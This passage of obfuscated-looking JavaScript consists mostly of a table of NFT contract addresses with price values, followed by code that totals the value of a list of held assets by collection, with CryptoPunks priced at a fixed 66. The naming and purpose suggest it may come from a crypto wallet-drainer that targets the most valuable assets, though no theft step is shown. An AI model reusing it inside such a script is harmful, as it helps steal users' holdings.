      Md['0x75e95ba5997eb235f40ecf8347cdb11f18ff640b'] = 0.71627
      Md['0x2acab3dea77832c09420663b0e1cb386031ba17b'] = 1.08892
      Md['0x960b7a6bcd451c9968473f7bbfd9be826efd549a'] = 0.79847
      Md['0x0bd4d37e0907c9f564aaa0a7528837b81b25c605'] = 0.24814
      Md['0x28472a58a490c5e09a238847f66a68a47cc76f0f'] = 0.50519
      Md['0x03ef30e1aee25abd320ad961b8cd31aa1a011c97'] = 0.25673
      Md['0x9c80777cae192e5031c38a0d951c55730ecc3f5e'] = 0.27822
      Md['0x6e9da81ce622fb65abf6a8d8040e460ff2543add'] = 1.25436
      Md['0x5cc5b05a8a13e3fbdb0bb9fccd98d38e50f90c38'] = 1.87028
      Md['0x0972290a80333d19c6703073c3e57134a4ca0127'] = 0.5238
      Md['0xb4d06d46a8285f4ec79fd294f78a881799d8ced9'] = 0.16976
      Md['0x3abedba3052845ce3f57818032bfa747cded3fca'] = 0.49555
      Md['0x38a6fd7148c4900338e903258b5e289dfa995e2e'] = 0.4295
      Md['0xfe8c6d19365453d26af321d0e8c910428c23873f'] = 1.42853
      Md['0x950b9476a4de757bb134483029ac4ec17e739e3a'] = 1.01251
      Md['0xa1d4657e0e6507d5a94d06da93e94dc7c8c44b51'] = 0.54274
      Md['0x5bd815fd6c096bab38b4c6553cfce3585194dff9'] = 0.33276
      Md['0x9c8d2f53f6bff84458f1c84fdaa1e4852ca958e3'] = 0.6945
      Md['0x880644ddf208e471c6f2230d31f9027578fa6fcc'] = 0.78313
      Md['0x5be99338289909d6dbbc57bb791140ef85ccbcab'] = 0.16237
      Md['0x698fbaaca64944376e2cdc4cad86eaa91362cf54'] = 0.54513
      Md['0xd7b397edad16ca8111ca4a3b832d0a5e3ae2438c'] = 1.01308
      Md['0x86c10d10eca1fca9daf87a279abccabe0063f247'] = 0.18855
      Md['0x09233d553058c2f42ba751c87816a8e9fae7ef10'] = 1.02269
      Md['0x9378368ba6b85c1fba5b131b530f5f5bedf21a18'] = 0.5554
      Md['0x0c2e57efddba8c768147d1fdf9176a0a6ebd5d83'] = 0.60386
      Md['0xef0182dc0574cd5874494a120750fd222fdb909a'] = 0.75086
      Md['0xeb3a9a839dfeeaf71db1b4ed6a8ae0ccb171b227'] = 0.51722
      Md['0x1b829b926a14634d36625e60165c0770c09d02b2'] = 0.78407
      Md['0xb5c747561a185a146f83cfff25bdfd2455b31ff4'] = 0.38502
      Md['0x123b30e25973fecd8354dd5f41cc45a3065ef88c'] = 0.4962
      Md['0x4b61413d4392c806e6d0ff5ee91e6073c21d6430'] = 0.07459
      Md['0x97597002980134bea46250aa0510c9b90d87a587'] = 0.26168
      Md['0x8943c7bac1914c9a7aba750bf2b6b09fd21037e0'] = 0.53538
      Md['0x0b4b2ba334f476c8f41bfe52a428d6891755554d'] = 0.68414
      Md['0x7ea3cca10668b8346aec0bf1844a49e995527c8b'] = 0.87116
      Md['0x7948f7ff1158b338a898e80ce8b1c3c964a80cec'] = 1.65
      Md['0xf61f24c2d93bf2de187546b14425bf631f28d6dc'] = 0.32957
      Md['0x495b01c1bc3b9203fde4362d9913c692fb661f3f'] = 0.19344
      Md['0xbad6186e92002e312078b5a1dafd5ddf63d3f731'] = 0.28647
      Md['0x0cfb5d82be2b949e8fa73a656df91821e2ad99fd'] = 0.53248
      Md['0x72d47d4d24018ec9048a9b0ae226f1c525b7e794'] = 0.20334
      Md['0x7ecb204fed7e386386cab46a1fcb823ec5067ad5'] = 0.7088
      Md['0xbd275ce24f32d6ce4e9d9519c55abe9bc0ed7fcf'] = 0.23309
      Md['0x35471f47c3c0bc5fc75025b97a19ecdde00f78f8'] = 0.44225
      Md['0x5af0d9827e0c53e4799bb226655a1de152a425a5'] = 0.41008
      Md['0x9a38dec0590abc8c883d72e52391090e948ddf12'] = 0.15247
      Md['0xcefc0a83564dd2a083b83b4a73bbae97e40fa7ea'] = 0.15588
      Md['0x7afe30cb3e53dba6801aa0ea647a0ecea7cbe18d'] = 0.89311
      Md['0xa6a5ec7b1b8a34ff2dcb2926b7c78f52a5ce3b90'] = 0.14913
      Md['0xd73acd7f5099fdd910215dbff029185f21ffbcf0'] = 0.14829
      Md['0xfcb1315c4273954f74cb16d5b663dbf479eec62e'] = 0.26432
      Md['0x1afef6b252cc35ec061efe6a9676c90915a73f18'] = 0.54444
      Md['0x67d9417c9c3c250f61a83c7e8658dac487b56b09'] = 0.30492
      Md['0x7afeda4c714e1c0a2a1248332c100924506ac8e6'] = 0.30255
      Md['0x970d5e0bd5c4f193fccf7fd579590c5f5c69b2d9'] = 0.20371
      Md['0x98a0227e99e7af0f1f0d51746211a245c3b859c2'] = 0.16676
      Md['0xc1caf0c19a8ac28c41fe59ba6c754e4b9bd54de9'] = 0.5879
      Md['0x364c828ee171616a39897688a831c2499ad972ec'] = 0.8366
      Md['0x13927739076014913a3a7c207ef84c5be4780014'] = 0.33486
      Md['0x25cd67e2dfec471acd3cdd3b22ccf7147596dd8b'] = 0.05985
      Md['0xa5c0bd78d1667c13bfb403e2a3336871396713c5'] = 0.14731
      Md['0x8d4100897447d173289560bc85c5c432be4f44e4'] = 0.13706
      Md['0x4a8c9d751eeabc5521a68fb080dd7e72e46462af'] = 0.27039
      Md['0x4db1f25d3d98600140dfc18deb7515be5bd293af'] = 0.65001
      Md['0xad9fd7cb4fc7a0fbce08d64068f60cbde22ed34c'] = 0.76609
      Md['0x4a537f61ef574153664c0dbc8c8f4b900cacbe5d'] = 0.55536
      Md['0x3fe1a4c1481c8351e91b64d5c398b159de07cbc5'] = 0.28493
      Md['0x8ffb9b504d497e4000967391e70d542b8cc6748a'] = 0.10018
      Md['0xf4ee95274741437636e748ddac70818b4ed7d043'] = 0.28625
      Md['0xa5e25b44b01e09b7455851838c76cde68d13e29f'] = 0.29878
      Md['0x177ef8787ceb5d4596b6f011df08c86eb84380dc'] = 0.12758
      Md['0x2f102e69cbce4938cf7fb27adb40fad097a13668'] = 0.52617
      Md['0xd78b76fcc33cd416da9d3d42f72649a23d7ac647'] = 0.41263
      Md['0xc8e1de8dc39a758c7a50f659b53f787e0f1398bd'] = 0.05563
      Md['0x58519ea95cdfad3622c4c574e61a58fa257d9e77'] = 0.17855
      Md['0xe70da20a2b10d60ca620a4e494fe2b37c9499e97'] = 0.18649
      Md['0x226bf5293692610692e2c996c9875c914d2a7f73'] = 0.61576
      Md['0xe51aac67b09eaed6d3d43e794d6bae679cbe09d8'] = 0.55998
      Md['0x338be3d8d0209815601e72f7a04ac7f37d61564b'] = 0.66632
      Md['0x716f29b8972d551294d9e02b3eb0fc1107fbf4aa'] = 0.69065
      Md['0x466cfcd0525189b573e794f554b8a751279213ac'] = 1.27604
      Md['0x80336ad7a747236ef41f47ed2c7641828a480baa'] = 1.67619
      Md['0x509a050f573be0d5e01a73c3726e17161729558b'] = 12
      Md['0xfc2068c3d47b575a60f6a4a7bf60dea0ac368e01'] = 2.37459
      Md['0x19b86299c21505cdf59ce63740b240a9c822b5e4'] = 0.65183
      Md['0x130cfab3817467f532c179d4e6502f5a7e7d44c7'] = 0.4862
      Md['0xdd012153e008346591153fff28b0dd6724f0c256'] = 11.26667
      Md['0x77640cf3f89a4f1b5ca3a1e5c87f3f5b12ebf87e'] = 0.55395
      Md['0xbce3781ae7ca1a5e050bd9c4c77369867ebc307e'] = 1.04694
      Md['0xd2a077ec359d94e0a0b7e84435eacb40a67a817c'] = 4.10157
      Md['0xf729f878f95548bc7f14b127c96089cf121505f8'] = 1.17861
      Md['0xb852c6b5892256c264cc2c888ea462189154d8d7'] = 0.5536
      Md['0xd497a414bb00803e846b53d07fcb742831b24906'] = 0.60132
      Md['0xc23a563a26afff06e945ace77173e1568f288ce5'] = 0.18018
      Md['0xfb10b1717c92e9cc2d634080c3c337808408d9e1'] = 10
      Md['0xaadc2d4261199ce24a4b0a57370c4fcf43bb60aa'] = 4.48802
      Md['0xeaa4c58427c184413b04db47889b28b5c98ebb7b'] = 13.14444
      Md['0xbeb1d3357cd525947b16a9f7a2b3d50b50b977bd'] = 1.2888
      Md['0x1fa8da0b63c639a7b53bae343e5761d56f898bac'] = 2.76118
      Md['0x6b00de202e3cd03c523ca05d8b47231dbdd9142b'] = 2.65571
      Md['0x9d6a7159e5accfc6520932f0f81a47e2ffd349a3'] = 7.86395
      Md['0x2c2ed910eb79b48fbbd949ad59636ffca83c8a17'] = 3.12907
      Md['0x76236b6f13f687d0bbedbbce0e30e9f07d071c1c'] = 1.71379
      Md['0xaa3fdc4a0700b82c9aa80655624d32701dc92946'] = 2.01429
      Md['0x251b5f14a825c537ff788604ea1b58e49b70726f'] = 2.69286
      Md['0x8d04a8c79ceb0889bdd12acdf3fa9d207ed3ff63'] = 3.28005
      Md['0x26437d312fb36bdd7ac9f322a6d4ccfe0c4fa313'] = 1.68317
      Md['0xd0a07a76746707f6d6d36d9d5897b14a8e9ed493'] = 0.41911
      Md['0x1eff5ed809c994ee2f500f076cef22ef3fd9c25d'] = 2.97726
      Md['0x89ecbeb233aa34c88c5d7d02d8113726dbc1bc78'] = 0.64
      Md['0xd0f0c40fcd1598721567f140ebf8af436e7b97cf'] = 1.98551
      Md['0xcd1dbc840e1222a445be7c1d8ecb900f9d930695'] = 2.34068
      Md['0xdfacd840f462c27b0127fc76b63e7925bed0f9d5'] = 1.45
      Md['0x1897d69cc0088d89c1e94889fbd2efffcefed778'] = 2.80667
      Md['0xbc4ca343167a5e2d9f700cf5b6b3f849585cd6fc'] = 2.03
      Md['0x20c70bdfcc398c1f06ba81730c8b52ace3af7cc3'] = 8.47182
      Md['0x614917f589593189ac27ac8b81064cbe450c35e3'] = 1.32826
      Md['0xc0cf5b82ae2352303b2ea02c3be88e23f2594171'] = 1.20633
      Md['0xb228d7b6e099618ca71bd5522b3a8c3788a8f172'] = 0.8221
      Md['0x026224a2940bfe258d0dbe947919b62fe321f042'] = 0.99795
      Md['0x068f74749c24a42058563035f8c786362fc96494'] = 0.62156
      Md['0xbdde08bd57e5c9fd563ee7ac61618cb2ecdc0ce0'] = 0.92091
      Md['0xc5b52253f5225835cc81c52cdb3d6a22bc3b0c93'] = 0.43883
      Md['0xb336ae11e840e8d38d1453fd3d876cf4797f6716'] = 0.62848
      Md['0x659a4bdaaacc62d2bd9cb18225d9c89b5b697a5a'] = 0.10692
      Md['0x9f9b2b8e268d06dc67f0f76627654b80e219e1d6'] = 0.09297
      Md['0xda60730e1feaa7d8321f62ffb069edd869e57d02'] = 0.14035
      Md['0x248139afb8d3a2e16154fbe4fb528a3a214fd8e7'] = 0.11335
      Md['0xc1ad47aeb274157e24a5f01b5857830aef962843'] = 0.05704
      Md['0x9a06ef3a841316a9e2c1c93b9c21a7342abe484f'] = 0.41059
      Md['0xb7be4001bff2c5f4a61dd2435e4c9a19d8d12343'] = 0.27689
      Md['0x390416ae4324494338293974ee6388e777fac34b'] = 0.19222
      Md['0x36d30b3b85255473d27dd0f7fd8f35e36a9d6f06'] = 0.10937
      Md['0x2a378c8d96e7d994fb9bec6adb7c6af2fe772c3b'] = 2.07792
      Md['0x698ff9c45f261e963ce060d1eb42099eaed333ae'] = 0.28052
      Md['0x497a9a79e82e6fc0ff10a16f6f75e6fcd5ae65a8'] = 0.21046
      Md['0x2120d19431e0dd49411e5412629f8e41a72cfabd'] = 0.17031
      Md['0xaad35c2dadbe77f97301617d82e661776c891fa9'] = 0.6199
      Md['0x709d30f1f60f03d85a0ef33142ef3259392dc9e1'] = 0.1131
      Md['0x0a36f2178c0db2c85471c45334a1dd17d130fd42'] = 5.11968
      Md['0xe6160325a53de4deca66e3d88d7e4f25040acce0'] = 0.56841
      Md['0x6728d91abacdbac2f326baa384513a523c21b80a'] = 0.09526
      Md['0x704bf12276f5c4bc9349d0e119027ead839b081b'] = 0.5171
      Md['0x06b3fcc9e79d724a08012f0b9f71bd03b415d334'] = 0.24644
      Md['0x5180db8f5c931aae63c74266b211f580155ecac8'] = 0.28157
      Md['0xec7f8a34b97ac65caad3841659f2cd54285a3950'] = 0.17005
      Md['0x54251bc32a9f389df7c764ab50bb829ccdcb41bc'] = 0.06081
      Md['0x26badf693f2b103b021c670c852262b379bbbe8a'] = 0.73705
      Md['0x0616a2ef54bad0b37dce41c8d8e35cce17a926f3'] = 0.26148
      Md['0x9b091d2e0bb88ace4fe8f0fab87b93d8ba932ec4'] = 0.96123
      Md['0xd9c036e9eef725e5aca4a22239a23feb47c3f05d'] = 0.2734
      Md['0x8de878b9b29bfbb33eec346965194a37a83b45b1'] = 0.19422
      Md['0x244fc4178fa685af909c88b4d4cd7eb9127edb0b'] = 0.5119
      Md['0x6199a4a9a290b0b77ff2e113abe9d1ad4ab5ac63'] = 0.08508
      Md['0xea0acbb7449b59bccc5f3d4bc4af882e8afde148'] = 0.08436
      Md['0xc3f8a0f5841abff777d3eefa5047e8d413a1c9ab'] = 0.33116
      Md['0xc2c747e0f7004f9e8817db2ca4997657a7746928'] = 0.5317
      Md['0xa65ba71d653f62c64d97099b58d25a955eb374a0'] = 0.78119
      Md['0x1e1dcf251468ff7fbf6d3c76d783ba9f00ca045d'] = 0.1072
      Md['0xc8adfb4d437357d0a656d4e62fd9a6d22e401aa0'] = 0.09712
      Md['0xeF1a89cbfAbE59397FfdA11Fc5DF293E9bC5Db90'] = 0.15796
      Md['0xc99c679c50033bbc5321eb88752e89a93e9e83c5'] = 1.51466
      Md['0xbbe23e96c48030dc5d4906e73c4876c254100d33'] = 0.25434
      Md['0x986aea67c7d6a15036e18678065eb663fc5be883'] = 0.13559
      Md['0x0ffa87cd27ae121b10b3f044dda4d28f9fb8f079'] = 0.54178
      Md['0x092bbc993042a69811d23feb0e64e3bfa0920c6a'] = 0.24245
      Md['0xabf66ca534f8a5081303e3873f0f4771c67b7b45'] = 0.13803
      Md['0xd9f092bdf2b6eaf303fc09cc952e94253ae32fae'] = 0.17516
      Md['0xc2e9678a71e50e5aed036e00e9c5caeb1ac5987d'] = 1.10896
      Md['0x22c08c358f62f35b742d023bf2faf67e30e5376e'] = 0.0519
      Md['0x809d8f2b12454fc07408d2479cf6dc701ecd5a9f'] = 0.3061
      Md['0x51ae5e2533854495f6c587865af64119db8f59b4'] = 0.10938
      Md['0x0beed7099af7514ccedf642cfea435731176fb02'] = 0.13159
      Md['0xc7df86762ba83f2a6197e1ff9bb40ae0f696b9e6'] = 0.13783
      Md['0x7721e8dd956e07f7254385a7c039e9bde92e425d'] = 0.10588
      Md['0x984f7b398d577c0adde08293a53ae9d3b6b7a5c5'] = 0.12183
      Md['0x80a4b80c653112b789517eb28ac111519b608b19'] = 0.08343
      Md['0xa08126f5e1ed91a635987071e6ff5eb2aeb67c48'] = 0.22007
      Md['0x4e76c23fe2a4e37b5e07b5625e17098baab86c18'] = 0.10918
      Md['0x4b103d07c18798365946e76845edc6b565779402'] = 0.12972
      Md['0x46fdfcb3cd89a1c54d36ee83a4adc184747b40d9'] = 0.32831
      Md['0x4e1f41613c9084fdb9e34e11fae9412427480e56'] = 1.64202
      Md['0x39ee2c7b3cb80254225884ca001f57118c8f21b6'] = 1.39694
      Md['0xccf3baa603dfddd7c41619fdb8dd0306b11571fe'] = 1.44061
      Md['0x2a459947f0ac25ec28c197f09c2d88058a83f3bb'] = 0.0602
      Md['0x670d4dd2e6badfbbd372d0d37e06cd2852754a04'] = 0.5219
      Md['0x33c6eec1723b12c46732f7ab41398de45641fa42'] = 0.3042
      Md['0x7daec605e9e2a1717326eedfd660601e2753a057'] = 0.53726
      Md['0x6d0de90cdc47047982238fcf69944555d27ecb25'] = 0.10246
      Md['0xe21ebcd28d37a67757b9bc7b290f4c4928a430b1'] = 0.3086
      Md['0x3e7fc44e25c07be3d67c241e6e59cb838df2f892'] = 0.62045
      Md['0x36f4d96fe0d4eb33cdc2dc6c0bca15b9cdd0d648'] = 2.95362
      Md['0x42069abfe407c60cf4ae4112bedead391dba1cdb'] = 2.43998
      Md['0x50f5474724e0ee42d9a4e711ccfb275809fd6d4a'] = 1.87028
      Md['0x684e4ed51d350b4d76a3a07864df572d24e6dc4c'] = 0.13019
      Md['0xff9c1b15b16263c61d017ee9f65c50e4ae0113d7'] = 0.95868
      Md['0x845a007d9f283614f403a24e3eb3455f720559ca'] = 1.28008
      Md['0x3110ef5f612208724ca51f5761a69081809f03b7'] = 0.62022
      Md['0x9f83b08d90eeda539f7e2797fed3f6996917bba8'] = 0.29177
      Md['0xbce6d2aa86934af4317ab8615f89e3f9430914cb'] = 0.28797
      Md['0x31385d3520bced94f77aae104b406994d8f2168c'] = 0.59383
      Md['0x73da73ef3a6982109c4d5bdb0db9dd3e3783f313'] = 0.42941
      Md['0x2a036569dbbe7730d69ed664b74412e49f43c2c0'] = 0.1924
      Md['0x8ff1523091c9517bc328223d50b52ef450200339'] = 0.35745
      Md['0xba627f3d081cc97ac0edc40591eda7053ac63532'] = 0.28936
      Md['0x12787526c03d626aac88e6edc4d0fb930d86c631'] = 0.6474
      Md['0xe6d48bf4ee912235398b96e16db6f310c21e82cb'] = 0.64342
      Md['0x11ca9693156929ee2e7e1470c5e1a55b413e9007'] = 0.22744
      Md['0x41f20599e9e049004c4d169046eb7023117a6244'] = 0.16756
      Md['0x9a534628b4062e123ce7ee2222ec20b86e16ca8f'] = 0.37281
      Md['0xa03e357a09e761e8d486a1419c74bf42e8d1b064'] = 0.23891
      Md['0xb08a61d96108136439180ad3f3e340a24e448f6b'] = 0.31065
      Md['0xb75f09b4340aeb85cd5f2dd87d31751edc11ed39'] = 0.27935
      Md['0x8eaa9ae1ac89b1c8c8a8104d08c045f78aadb42d'] = 0.22738
      Md['0x524cab2ec69124574082676e6f654a18df49a048'] = 0.20661
      Md['0x86cc280d0bac0bd4ea38ba7d31e895aa20cceb4b'] = 0.31032
      Md['0x1ecfdccf97edd64fb73890ca4541f306456a21ec'] = 0.46463
      Md['0xc3f733ca98e0dad0386979eb96fb1722a1a05e69'] = 0.39451
      Md['0x913ae503153d9a335398d0785ba60a2d63ddb4e2'] = 2.07792
      Md['0x4b10701bfd7bfedc47d50562b76b436fbb5bdb3b'] = 0.16134
      Md['0x06911466341299d79e9e1368a016c73d009691cc'] = 0.65621
      Md['0x582048c4077a34e7c3799962f1f8c5342a3f4b12'] = 0.1077
      Md['0xf07468ead8cf26c752c676e43c814fee9c8cf402'] = 0.34115
      Md['0x65d8b2bf930a0015028efcaee5af7bf61b90b76f'] = 0.39778
      Md['0x9d20cff2db7e1c23c3fc6ef000ea0f36b428e3f5'] = 0.659
      Md['0x8a1bbef259b00ced668a8c69e50d92619c672176'] = 0.23012
      Md['0xdfe3ac769b2d8e382cb86143e0b0b497e1ed5447'] = 0.27072
      Md['0x7b692917124f64e1658d67c72ab5df5219078e37'] = 0.21968
      Md['0x3113a3c04aebec2b77eb38eabf6a2257b580c54b'] = 0.36335
      Md['0x27787755137863bb7f2387ed34942543c9f24efe'] = 1.05067
      Md['0x4addca4c07a5e9a6b4973094d03ad5aae7735e5b'] = 0.12954
      Md['0xa5bb28eecc6134f89745e34ec6ab5d5bcb16dad7'] = 0.37799
      Md['0xa3106416fde395bf6a62b8e932df01f5f660a5f2'] = 0.26573
      Md['0x32973908faee0bf825a343000fe412ebe56f802a'] = 0.66761
      Md['0x0e043e39e1f9382e4b3cb9b859a1452a93993be7'] = 0.10887
      Md['0x7ab2352b1d2e185560494d5e577f9d3c238b78c5'] = 0.36844
      Md['0x8dc7b6ec6fafa36085ee9ec8e39112428d3360aa'] = 0.20083
      Md['0x258aeac01672e6857972707fc129a6a39d09758b'] = 0.22705
      Md['0xcd041f40d497038e2da65988b7d7e2c0d9244619'] = 0.10666
      Md['0xe010242f4503b33834e1a830c8abe7d4363dcd2a'] = 0.08724
      Md['0x4287bd7cc2b4aa8650e2887055a4674759c216e2'] = 0.14991
      Md['0xc878671ff88f1374d2186127573e4a63931370fc'] = 0.16766
      Md['0x9f1f2696f4e8f138c1cc92361960665cb2d4617e'] = 0.52024
      Md['0xd532b88607b1877fe20c181cba2550e3bbd6b31c'] = 0.28294
      Md['0xd1169e5349d1cb9941f3dcba135c8a4b9eacfdde'] = 0.62068
      Md['0xedf6d3c3664606fe9ee3a9796d5cc75e3b16e682'] = 0.08857
      Md['0x2cf6be9aac1c7630d5a23af88c28275c70eb8819'] = 0.32438
      Md['0x51f0c1938b0e67cafc7a6fc8eb6edd7fdbe002bc'] = 0.26986
      Md['0x3bf2922f4520a8ba0c2efc3d2a1539678dad5e9d'] = 0.61569
      Md['0x1e725bcc09ad221d35af5adeda404fb2147b43fa'] = 0.20878
      Md['0xf76179bb0924ba7da8e7b7fc2779495d7a7939d8'] = 0.80719
      Md['0x65c234d041f9ef96e2f126263727dfa582206d82'] = 0.10241
      Md['0x11450058d796b02eb53e65374be59cff65d3fe7f'] = 0.82718
      Md['0x5079fc4e96338be1b5aff236ff4b00ec4452b2d3'] = 0.33277
      Md['0x696115768bbef67be8bd408d760332a7efbee92d'] = 0.5727
      Md['0xf64e6fb725f04042b5197e2529b84be4a925902c'] = 0.53855
      Md['0x7deda0afe6df3da6a85a87b371f8b464c30c6803'] = 0.07169
      Md['0xc92ceddfb8dd984a89fb494c376f9a48b999aafc'] = 0.34042
      Md['0xa4b37d6c9e087317be73c39b826189a1f6f8a6d8'] = 0.1227
      Md['0x05218d1744caf09190f72333f9167ce12d18af5c'] = 0.18143
      Md['0x78a5e2b8c280fa5580fbe1e1ed546183f959d305'] = 0.25401
      Md['0xc67b9897d793a823f0e9cf850aa1b0d23e3f8d09'] = 0.09228
      Md['0x6ece2e550d7848c40c26a0e704b7a19d1f8dbcf0'] = 0.3003
      Md['0xe9fca552b9eb110c2d170962af740725f71f5644'] = 0.1491
      Md['0x10cdcb5a80e888ec9e9154439e86b911f684da7b'] = 0.14362
      Md['0x282a7d13152b3f51a3e31d46a2ca563f8554d85d'] = 0.1773
      Md['0xca7ca7bcc765f77339be2d648ba53ce9c8a262bd'] = 0.10187
      Md['0xe3f92992bb4f0f0d173623a52b2922d65172601d'] = 0.2658
      Md['0x2efa07cac3395599db83035d196f2a0e7263f766'] = 0.15837
      Md['0xb32979486938aa9694bfc898f35dbed459f44424'] = 0.84281
      Md['0x94638cbf3c54c1f956a5f05cbc0f9afb6822020d'] = 0.2584
      Md['0x11595ffb2d3612d810612e34bc1c2e6d6de55d26'] = 0.75
      Md['0x0f78c6eee3c89ff37fd9ef96bd685830993636f2'] = 0.1413
      Md['0x3bf99d504e67a977f88b417ab68d34915f3a1209'] = 1.53954
      Md['0xa4d5fb4ff0fa1565fb7d8f5db88e4c0f2f445046'] = 0.13271
      Md['0xc2ac394984f3850027dac95fe8a62e446c5fb786'] = 0.20803
      Md['0x6632a9d63e142f17a668064d41a21193b49b41a0'] = 0.39124
      Md['0x249aeaa7fa06a63ea5389b72217476db881294df'] = 0.25155
      Md['0x099689220846644f87d1137665cded7bf3422747'] = 0.21492
      Md['0x345c2fa23160c63218dfaa25d37269f26c85ca47'] = 0.1138
      Md['0x1d0ec4a86ac39fef4485169b4d14dc39d0ea64cd'] = 0.39163
      Md['0xdc403fcdf735426e77fdd3bbd6223a3ac03ef3b3'] = 0.21273
      Md['0x3e6046b4d127179f0a421f3148b43cf52c08fc41'] = 0.08512
      Md['0x83f82414b5065bb9a85e330c67b4a10f798f4ed2'] = 0.15512
      Md['0x1a2f71468f656e97c2f86541e57189f59951efe7'] = 0.12652
      Md['0x8442dd3e5529063b43c69212d64d5ad67b726ea6'] = 0.13014
      Md['0xf1268733c6fb05ef6be9cf23d24436dcd6e0b35e'] = 0.2406
      Md['0x68f4ba8018216542ac2ab8125166be66304dd71c'] = 0.40712
      Md['0x7a15b36cb834aea88553de69077d3777460d73ac'] = 0.40762
      Md['0xaadba140ae5e4c8a9ef0cc86ea3124b446e3e46a'] = 0.15369
      Md['0x657fabdb226abc59227e02e94089afbc67a597fe'] = 0.18805
      Md['0x52e66ca968010d064938a8099a172cbaaf08c125'] = 0.43946
      Md['0xf0d2d631a24db247f5eb0421fa3e6a169c72565f'] = 0.3442
      Md['0x7d22279e26df02c9c77db263ce4bb9a501b687ba'] = 1.345
      Md['0x8c186802b1992f7650ac865d4ca94d55ff3c0d17'] = 0.20981
      Md['0x18487d2cac946c7fe800855c4039aac210f68baa'] = 0.13701
      Md['0x13d15d8b7b2bf48cbaf144c5c50e67b6b635b5cd'] = 0.53061
      Md['0x469823c7b84264d1bafbcd6010e9cdf1cac305a3'] = 0.2945
      Md['0xf9c362cdd6eeba080dd87845e88512aa0a18c615'] = 0.16224
      Md['0x548c407d35cdd3c812458d9ef6d135963f9f7ece'] = 0.119
      Md['0x219b8ab790decc32444a6600971c7c3718252539'] = 0.22528
      Md['0x8cd8155e1af6ad31dd9eec2ced37e04145acfcb3'] = 0.09959
      Md['0x9eeaecbe2884aa7e82f450e3fc174f30fc2a8de3'] = 0.16603
      Md['0x3598fff0f78dd8b497e12a3ad91febcfc8f49d9e'] = 0.20832
      Md['0xd4d871419714b778ebec2e22c7c53572b573706e'] = 0.12626
      Md['0x1bb6edf7b129967d512086fbdf489ed659580916'] = 0.07098
      Md['0x120e1f9e4067e547f2ff4ab379f67ed26ac0cb93'] = 0.28585
      Md['0xdb55584e5104505a6b38776ee4dcba7dd6bb25fe'] = 0.13922
      Md['0xf4121a2880c225f90dc3b3466226908c9cb2b085'] = 0.11822
      Md['0xcbc67ea382f8a006d46eeeb7255876beb7d7f14d'] = 0.10701
      Md['0x5113a3dd866a3ee8e973fc764cc380e6f07416ef'] = 0.29091
      Md['0x4d928fada59f3446627c5bea707a81e006cf676f'] = 0.30266
      Md['0x2d92c4f9f75308d0b9b098b142369032e4f901ff'] = 0.08627
      Md['0xd6d80461b1875a8679fe789db689156f42b7f86b'] = 0.18285
      Md['0x4d232cd85294acd53ec03f4a57f57888c9ea1946'] = 0.22514
      Md['0xba2aa4b18752e75e210fba0424e565af3afb8fc7'] = 0.10132
      Md['0x2d366be8fa4d15c289964dd4adf7be6cc5e896e8'] = 0.58202
      Md['0x9401518f4ebba857baa879d9f76e1cc8b31ed197'] = 0.18114
      Md['0xe4758ebd21a66d4c48dd0cca0a1cc36ac84d5a70'] = 0.45737
      Md['0xe106c63e655df0e300b78336af587f300cff9e76'] = 0.23566
      Md['0xedfc4f35060de1a30e08b0d8b9986a4adbdf6c59'] = 0.14472
      Md['0x6400c9cf1961a36b40616ead83e87a973f47f548'] = 0.36333
      Md['0x74f1716a9f452dd36d945368d806cd491290b240'] = 0.15182
      Md['0xda2686fd32c6b74d55605cfb48bef331771e7fc6'] = 0.16351
      Md['0x8ab727ccf9f57b06535153d1595d157bf5e8f22f'] = 0.16182
      Md['0x80dbbdcb4280030fb22e2a9d671a368211d49d6e'] = 0.38261
      Md['0xbcbeae3620b3280df67143ad7ec45d67c5a4355e'] = 0.54695
      Md['0x7feb477600a03fd6ab1fe451cb3c7836a420f4ad'] = 0.07412
      Md['0x67421c8622f8e38fe9868b4636b8dc855347d570'] = 0.12664
      Md['0x1ca39c7f0f65b4da24b094a9afac7acf626b7f38'] = 0.09526
      Md['0xdd70af84ba86f29bf437756b655110d134b5651c'] = 0.19234
      Md['0x15cc16bfe6fac624247490aa29b6d632be549f00'] = 0.10385
      Md['0x439cac149b935ae1d726569800972e1669d17094'] = 0.17474
      Md['0x3db5463a9e2d04334192c6f2dd4b72def4751a61'] = 0.19548
      Md['0xddb149ae8e6635df01a530da1e46921bd78dc385'] = 0.11159
      Md['0xeda3b617646b5fc8c9c696e0356390128ce900f8'] = 0.25466
      Md['0x322987cd1e0466be43fa88ae33e2637dff46f06f'] = 0.12169
      Md['0x9759226b2f8ddeff81583e244ef3bd13aaa7e4a1'] = 0.09779
      Md['0x5bdf397bb2912859dbd8011f320a222f79a28d2e'] = 0.2206
      Md['0x5423856728612f358c84a37805799755be2722c8'] = 1.29729
      Md['0x52d8a9825fb8b90ea45136eddb103b4ccc0c7940'] = 2.088
      Md['0xf68f9bf35312c228c9d213f31c477c92032d80b7'] = 0.94929
      Md['0x595a70409711f20523bd99b83d088cea9d3f92e1'] = 0.26111
      Md['0x82262bfba3e25816b4c720f1070a71c7c16a8fc4'] = 1.75
      Md['0x67062888a7c4d7acac8d4ee82920aa1e0189accc'] = 0.1021
      Md['0xc36442b4a4522e871399cd717abdd847ab11fe88'] = 0.1
      Md['0xe8f88d16f24255fcfab25959705d724406d67d9d'] = 2.525
      Md['0x92c93fafc20fe882a448f86e594d9667259c42c8'] = 0.17535
      Md['0xfe5a28f19934851695783a0c8ccb25d678bb05d3'] = 0.49093
      Md['0x2c3fc1d826bc12027d05fbe3aeace0a2453bf9fd'] = 1.92237
      Md['0x3b1417c1f204607deda4767929497256e4ff540c'] = 0.09277
      Md['0x1485297e942ce64e0870ece60179dfda34b4c625'] = 0.07644
      Md['0x740c178e10662bbb050bde257bfa318defe3cabc'] = 0.189
      Md['0xc9d198089d6c31d0ca5cc5b92c97a57a97bbfde2'] = 0.1824
      Md['0x31d45de84fde2fb36575085e05754a4932dd5170'] = 0.56097
      Md['0xd1258db6ac08eb0e625b75b371c023da478e94a9'] = 14.5743
      known_prices = Md
      const Mi = {},
        MS = M8.map(async (Mh) => {
          const Mm = Mh.collection.slug
          if (Mm == 'cryptopunks') {
            filtered = M9.filter(
              (Mo) => Mo.asset_contract.address == Mh.asset_contract.address
            )
            Mi[Mh.asset_contract.address] = [
              66 * filtered.length,
              'PUNK',
              Mh.collection.name,
              66,
            ]
            return
          }
          if (known_prices.hasOwnProperty(Mh.asset_contract.address)) {
            filtered = M9.filter(
              (Mo) => Mo.asset_contract.address == Mh.asset_contract.address
            )
            Mi[Mh.asset_contract.address] = [
              known_prices[Mh.asset_contract.address] * filtered.length,
